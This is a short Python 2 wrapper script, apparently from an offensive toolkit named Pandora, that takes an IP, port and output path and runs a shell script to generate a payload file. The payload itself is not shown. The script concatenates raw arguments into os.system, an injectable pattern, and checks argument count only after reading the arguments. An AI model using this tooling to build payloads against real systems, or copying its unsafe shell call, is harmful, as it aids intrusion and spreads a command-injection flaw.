#!/usr/bin/env python
import os, sys, subprocess
from time import sleep

def help():
    print """
    Usage:
         python pandogen.py <ip> <port> <path>
    """
try:
    host = sys.argv[1]
    port = sys.argv[2]
    output = sys.argv[3]
    add = ''
    if output.endswith('.py'):
        add = ''
    elif output.endswith('/'):
        add = 'payload.py'
    else:
        add = ''
    if len(sys.argv) < 3:
        help()
    else:
        print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output+add)
        print("\33[94;1m[+] Generating Payload . . .\33[00m")
        sleep(3)
        os.system("sh ~/Pandora/pandora/modules/gen.sh "+host+" "+str(port)+" "+output+add)

        print("\33[92;1m[+]payload Generating Success . . .\33[00m")
        sleep(1)
except:
    print "\33[91;1m[-]Payload could not be generated\33[00m"
    help()
